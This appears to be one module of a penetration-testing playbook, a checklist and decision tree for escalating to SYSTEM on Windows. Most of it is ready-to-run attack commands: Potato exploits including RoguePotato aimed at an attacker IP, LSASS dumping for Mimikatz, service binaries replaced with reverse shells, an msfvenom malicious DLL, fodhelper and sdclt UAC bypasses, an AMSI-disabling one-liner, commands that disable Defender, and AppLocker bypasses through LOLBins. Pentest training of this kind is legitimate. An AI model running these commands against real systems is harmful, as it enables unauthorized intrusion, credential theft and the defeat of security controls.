# Module 10: Windows Privilege Escalation

## When to Use This Module
Use this module when you have a non-administrative shell on a Windows system. The goal is to escalate privileges to Local Administrator, NT AUTHORITY\SYSTEM, or another higher-privileged user.

## Prerequisites
- Working shell on target (reverse/bind/WinRM/RDP) — from Module 05
- PowerShell available (may be restricted)
- File transfer method available (Module 05)

## Entry Check

```
Shell obtained on Windows host?
├── Run initial enumeration:
│   ├── whoami → Current user
│   ├── whoami /priv → Current privileges
│   ├── whoami /groups → Group memberships
│   ├── hostname → System name
│   ├── systeminfo → OS version, patch level
│   ├── net users → Local users
│   ├── net localgroup Administrators → Local admins
│   ├── ipconfig → Network configuration
│   └── netstat -ano → Active connections
│
├── Automated enumeration:
│   ├── winPEASany.exe → Run it
│   ├── Seatbelt.exe → Run it
│   └── PowerUp.ps1 → IEX (import-module) → Invoke-AllChecks
│
├── Check domain join:
│   ├── systeminfo | findstr Domain
│   └── If domain joined → Check Module 11
│
└── Begin systematic check of each privesc vector
```

## PrivEsc Vector Decision Tree

```
Need to escalate privileges?
├── Check EACH of these vectors:
│
│   1. Token privileges
│   ├── whoami /priv
│   ├── SeImpersonatePrivilege? → Potato exploit selection:
│   │   ├── Check OS: systeminfo | findstr /B "OS"
│   │   ├── Windows 7/2008 R2 → JuicyPotato (needs CLSID selection)
│   │   │   ├── JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
│   │   │   └── CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID
│   │   ├── Windows 10/2016/2019 → PrintSpoofer (most reliable)
│   │   │   └── PrintSpoofer.exe -i -c "cmd.exe"
│   │   ├── Windows Server 2022 → GodPotato
│   │   │   └── GodPotato.exe -cmd "cmd.exe"
│   │   ├── Any version (if SMB firewall open) → RoguePotato
│   │   │   └── RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 9999
│   │   ├── Any version → SharpEfsPotato (if EFS service available)
│   │   └── Universal fallback → JuicyPotatoNG (no CLSID needed, 2016+)
│   │       └── JuicyPotatoNG.exe -t * -p "cmd.exe"
│   ├── SeDebugPrivilege?
│   │   ├── ProcDump LSASS → minidump → Mimikatz offline
│   │   └── psgetsystem → Spawn SYSTEM shell
│   ├── SeBackupPrivilege?
│   │   └── robocopy /B to backup SAM/SYSTEM
│   ├── SeTakeOwnershipPrivilege?
│   │   └── takeown + icacls on protected files
│   ├── SeRestorePrivilege?
│   │   └── Write files to protected locations (abuse via arbitrary file write)
│   ├── SeLoadDriverPrivilege?
│   │   └── Capcom.sys → Load kernel driver → SYSTEM
│   │   └── OR: EoPLoadDriver.exe .\driver.sys
│   └── SeCreateTokenPrivilege?
│       └── Forge token with SYSTEM SID → impersonate
│           └── Use "CreateToken" PoC or PowerSploit Invoke-CreateToken
│
│   2. Service misconfigurations
│   ├── Unquoted service path?
│   │   ├── wmic service get name,pathname | findstr /i /v "C:\Program Files"
│   │   └── Insert malicious exe in writable path portion
│   ├── Writable service binary?
│   │   ├── sc qc <service> → Check binary_path_name
│   │   ├── icacls <binary> → Check if writable
│   │   └── Replace with reverse shell binary
│   ├── Writable service config?
│   │   ├── sc config <service> binpath= "cmd /c reverse_shell"
│   │   └── Requires SERVICE_ALL_ACCESS
│   └── AlwaysInstallElevated?
│       ├── Check both HKLM and HKCU
│       └── Create malicious MSI → msiexec /quiet /qn /i install.msi
│
│   3. Stored credentials
│   ├── cmdkey /list → Stored creds
│   ├── findstr /si password *.txt *.ini *.config
│   ├── PowerShell history: (Get-PSReadlineOption).HistorySavePath
│   ├── Unattended install files: Unattend.xml
│   ├── Group Policy preferences: groups.xml (password in cpassword)
│   └── gpp-decrypt <cpassword>
│
│   4. DLL hijacking
│   ├── Methodology:
│   │   ├── Find services with writable directories in PATH
│   │   ├── Use Process Monitor (procmon): filter by "NAME NOT FOUND"
│   │   ├── Identify DLLs the service tries to load but can't find
│   │   ├── Check which directories in the search path are writable
│   │   └── Place malicious DLL with the missing name in writable dir
│   ├── Quick check without procmon:
│   │   ├── powershell -c "Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.FileName -match 'writable_path' }"
│   │   ├── Check service PATH: sc qc <service> → look for unquoted/writable paths
│   │   └── Use Invoke-PrivescCheck or SpiPy to find missing DLLs
│   ├── Generate malicious DLL:
│   │   ├── msfvenom -p windows/x64/exec CMD='cmd.exe' -f dll -o evil.dll
│   │   └── OR: cross-compile C DLL that runs system("cmd.exe")
│   └── Restart service: sc stop <service> && sc start <service>
│
│   5. Scheduled tasks
│   ├── schtasks /query /fo LIST /v
│   ├── Check for writable scripts run as SYSTEM
│   └── Replace with reverse shell
│
│   6. Registry autoruns
│   ├── reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
│   ├── Check for writable autorun paths
│   └── Replace with malicious binary
│
│   7. UAC bypass
│   ├── Check EnableLUA = 1? → UAC enabled
│   ├── Check if admin but filtered token (whoami /groups → Mandatory Label\Medium)
│   ├── UAC bypass techniques (require admin user, not standard user):
│   │   ├── fodhelper.exe (registry key manipulation):
│   │   │   ├── reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
│   │   │   ├── reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f
│   │   │   └── Start-Process fodhelper.exe
│   │   ├── computerdefaults.exe (same registry technique as fodhelper)
│   │   ├── sdclt.exe (same registry technique, different key path):
│   │   │   ├── reg add HKCU\Software\Classes\exefile\shell\open\command /ve /d "cmd.exe" /f
│   │   │   └── Start-Process sdclt.exe
│   │   ├── ICMLuaUtil (auto-elevated COM object):
│   │   │   └── Use CMLuaUtil bypass via COM interface
│   │   └── Tools: UACME (akagi64.exe) — 50+ methods, try method 23, 31, 33
│   └── Note: UAC bypass only works if user is in Administrators group
│
│   8. Kernel exploits
│   ├── searchsploit windows kernel <version>
│   ├── systeminfo → Check patch level with Watson
│   ├── Common CVEs:
│   │   ├── CVE-2021-36934 (HiveNightmare) → SAM read
│   │   ├── CVE-2021-34527 (PrintNightmare)
│   │   └── MS17-010 (EternalBlue) → SMB RCE
│   └── Use Windows Exploit Suggester
│
│   9. Group abuse
│   ├── DnsAdmins?
│   │   └── dnscmd /config /serverlevelplugindll → SYSTEM
│   ├── Server Operators?
│   │   └── sc config on DC services
│   ├── Print Operators?
│   │   └── SeLoadDriverPrivilege → SYSTEM
│   └── Backup Operators?
│       └── robocopy /B → Domain backup
│
│   10. Named pipe abuse
│   ├── Find writable pipes
│   └── Impersonation via pipe
│
│   11. AMSI bypass (if PowerShell blocked by AMSI)
│   ├── Check if AMSI enabled: [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")
│   ├── Bypass 1 (reflection — patch amsi.dll):
│   │   └── [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
│   ├── Bypass 2 (memory patch):
│   │   └── Use AmsiScanBuffer patch: overwrite AmsiScanBuffer return to 0 (AMSI_RESULT_CLEAN)
│   ├── Bypass 3 (hardware breakpoint):
│   │   └── Use SharpBreakpoint to hook AmsiScanBuffer
│   └── Bypass 4 (obfuscation):
│       └── Obfuscate PowerShell scripts with Invoke-Obfuscation or AMSI.fail
│
│   12. Windows Defender exclusion (if Defender blocks tools)
│   ├── Add exclusion (requires admin):
│   │   ├── powershell Set-MpPreference -ExclusionPath "C:\Temp"
│   │   ├── powershell Set-MpPreference -ExclusionProcess "payload.exe"
│   │   └── powershell Set-MpPreference -ExclusionExtension ".exe"
│   ├── Disable real-time protection (requires admin):
│   │   ├── powershell Set-MpPreference -DisableRealtimeMonitoring $true
│   │   └── OR: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
│   ├── Disable Defender entirely (requires SYSTEM):
│   │   └── sc stop WinDefend && sc config WinDefend start= disabled
│   └── If no admin: Use obfuscated tools, .NET assemblies, or LOLBins
│
│   13. AppLocker / Constrained Language Mode bypass
│   ├── Check if AppLocker enforced:
│   │   ├── powershell Get-AppLockerPolicy -Effective -Xml
│   │   └── $ExecutionContext.SessionState.LanguageMode (if "Constrained" → CLM active)
│   ├── AppLocker bypass (find allowed execution paths):
│   │   ├── Default allow: C:\Windows\System32\*, C:\Windows\*
│   │   ├── Bypass via LOLBins: rundll32.exe, regsvr32.exe, mshta.exe, wscript.exe
│   │   ├── Bypass via installutil.exe: InstallUtil.exe /logfile= /LogToConsole=false payload.dll
│   │   └── Bypass via MSBuild: msbuild.exe payload.csproj
│   ├── CLM bypass:
│   │   ├── Use COM objects to execute (System32 COM hijacking)
│   │   ├── Use Runspace factories (bypasses CLM)
│   │   └── Install-Module -Name Nishang; Use Invoke-PowerShellTcpOneLine
│   └── If both enforced: Use C# compiled executables or native Windows binaries
│
└── None worked? → Re-enumerate
    ├── Run winPEAS if you haven't
    ├── Check all user directories for stored creds
    ├── Check registry for passwords
    ├── Check IIS logs for sensitive data
    └── Check mounted VHDX/VMDK files for SAM
```

## Key Commands

```powershell
# Service enumeration
wmic service get name,displayname,pathname,startname
Get-Service
Get-CimInstance -ClassName Win32_Service

# Running processes
Get-Process
tasklist /SVC

# Network connections
netstat -ano

# Writable service binary check
icacls "C:\Program Files\SomeService\service.exe"

# Unquoted service path check
wmic service get name,pathname | findstr /i /v "C:\Program Files"

# Registry check for auto-start
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Local admin group
net localgroup Administrators

# Password in files
findstr /si password *.txt *.ini *.config *.xml
```

## Cross-References
- For post-exploitation after admin → [Module 13: Post-Exploitation](13-post-exploitation.md)
- For AD attacks if domain-joined → [Module 11: Active Directory](11-active-directory.md)
- For lateral movement → [Module 12: Lateral Movement & Pivoting](12-lateral-pivot.md)
- For password cracking → [Module 06: Password Attacks](06-password-attacks.md)

## Output Summary
- [ ] Initial enumeration complete
- [ ] Token privileges checked (SeImpersonate, SeDebug, SeCreateToken, etc.)
- [ ] Potato exploit selected based on OS version
- [ ] Service misconfigurations checked (unquoted paths, writable binaries)
- [ ] Stored credentials searched
- [ ] DLL hijacking checked (procmon / quick check)
- [ ] Scheduled tasks enumerated
- [ ] Kernel exploits checked via Windows Exploit Suggester
- [ ] UAC bypass attempted with actual commands (if needed)
- [ ] AMSI bypass attempted (if PowerShell blocked)
- [ ] Defender exclusion added (if tools blocked)
- [ ] AppLocker/CLM bypass attempted (if enforced)
- [ ] All findings documented
- [ ] Admin/SYSTEM access achieved (or confirmed no path)
